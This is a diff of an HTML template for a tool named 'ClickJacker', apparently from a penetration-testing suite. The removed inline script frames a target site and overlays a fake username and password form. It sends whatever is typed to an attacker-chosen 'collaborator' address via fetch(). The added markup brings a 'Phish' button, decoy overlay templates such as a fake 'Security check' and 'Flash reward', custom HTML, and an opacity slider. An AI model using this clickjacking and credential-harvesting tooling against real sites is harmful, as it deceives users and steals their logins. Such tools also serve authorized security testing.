@@ -5,112 +5,7 @@
 	<link rel="stylesheet" type="text/css" href="/static/erebus.css">
 	<link rel="stylesheet" type="text/css" href="/static/clickjack.css">
 	<title>ClickJacker</title>
-
-	<script type="text/javascript">
-		var elIframe, elWebInput, elCollabInput, elHistory;
-		var HISTORY_LIMIT = 20;
-
-
-		function loadWebsite() {
-			var url = elWebInput.value.trim();
-			if (!url) return;
-			elIframe.src = url;
-			addToHistory(url);
-		}
-
-		function addToHistory(url) {
-			var items = elHistory.querySelectorAll("li");
-			for (var i = 0; i < items.length; i++) {
-				if (items[i].dataset.url === url) return;
-			}
-			// Enforce history cap
-			if (items.length >= HISTORY_LIMIT) {
-				elHistory.removeChild(elHistory.lastElementChild);
-			}
-
-			var li = document.createElement("li");
-			li.dataset.url = url;
-			li.title = url;
-
-			var label = document.createElement("span");
-			label.className = "url-label";
-			label.textContent = url;
-
-			var btn = document.createElement("button");
-			btn.className = "url-load";
-			btn.textContent = "Load";
-			btn.onclick = (function(u) {
-				return function() {
-					elWebInput.value = u;
-					elIframe.src = u;
-				};
-			})(url);
-
-			li.appendChild(label);
-			li.appendChild(btn);
-			elHistory.prepend(li);
-		}
-
-		function clickjackOverlay() {
-			if (document.getElementById("overlay")) return;
-
-			var link = document.createElement("link");
-			link.setAttribute("rel", "stylesheet");
-			link.setAttribute("href", "/static/clickjack.css");
-
-			var overlay = document.createElement("div");
-			overlay.id = "overlay";
-			overlay.innerHTML = `<form id="signin_form" method="POST" action="javascript:sendData()">
-				<label>Username:</label>
-				<input name="username" id="username" type="text">
-				<label>Password:</label>
-				<input name="password" id="password" type="password">
-				<input type="submit" value="Submit">
-			</form>`;
-
-			document.head.appendChild(link);
-			document.getElementById("wrapper").appendChild(overlay);
-
-			var resetBtn = document.getElementById("overlay-reset");
-			if (resetBtn) resetBtn.style.display = "inline-block";
-		}
-
-		function removeOverlay() {
-			var overlay = document.getElementById("overlay");
-			if (overlay) overlay.parentNode.removeChild(overlay);
-			var resetBtn = document.getElementById("overlay-reset");
-			if (resetBtn) resetBtn.style.display = "none";
-		}
-
-		async function sendData() {
-			var signinForm = document.querySelector("#signin_form");
-			var formData = new FormData(signinForm);
-			try {
-				var response = await fetch(elCollabInput.value, {
-					method: "POST",
-					body: formData,
-				});
-				console.log(await response.json());
-			} catch (e) {
-				console.error(e);
-			}
-		}
-
-		document.addEventListener("DOMContentLoaded", function() {
-			elIframe      = document.getElementsByName("website")[0];
-			elWebInput    = document.getElementsByName("webInput")[0];
-			elCollabInput = document.getElementsByName("collabInput")[0];
-			elHistory     = document.getElementById("url-history");
-
-			if (elIframe.src && elIframe.src !== "about:blank" && elIframe.src !== window.location.href) {
-				addToHistory(elIframe.src);
-			}
-
-			elWebInput.addEventListener("keydown", function(e) {
-				if (e.key === "Enter") loadWebsite();
-			});
-		});
-	</script>
+	<script src="/static/app.js"></script>
 </head>
 <body>
 	<nav class="nav">
@@ -129,13 +24,34 @@
 			<div class="control-row">
 				<span class="control-label">Web page to clickjack:</span>
 				<input name="webInput" value="{{.Site}}">
-				<button onclick="loadWebsite()">Submit</button>
+				<button id="submit-btn">Submit</button>
 			</div>
 			<div class="control-row">
 				<span class="control-label">Collaborator address:</span>
 				<input name="collabInput" value="{{.Collab}}">
-				<button onclick="clickjackOverlay()">Clickjack</button>
-				<button id="overlay-reset" onclick="removeOverlay()" style="display:none;">Remove Overlay</button>
+				<button id="phish-btn">Phish</button>
+				<button id="overlay-reset" style="display:none;">Remove Overlay</button>
+			</div>
+			<div class="control-row">
+				<span class="control-label">Decoy overlay:</span>
+				<select id="decoy-template">
+					<option value="fake-button">Fake button</option>
+					<option value="survey">Survey prompt</option>
+					<option value="security">Security check</option>
+					<option value="reward">Flash reward</option>
+					<option value="custom">Custom</option>
+				</select>
+				<button id="decoy-btn">Clickjack</button>
+				<button id="decoy-reset" style="display:none;">Remove Decoy</button>
+				<span id="opacity-controls" style="display:none;">
+					<span class="control-label">Opacity:</span>
+					<input type="range" id="opacity-slider" min="0" max="100" value="100">
+					<span id="opacity-value">100%</span>
+				</span>
+			</div>
+			<div class="control-row" id="custom-html-row" style="display:none;">
+				<span class="control-label">Custom HTML:</span>
+				<textarea id="custom-html-input" rows="2"></textarea>
 			</div>
 		</div>
 
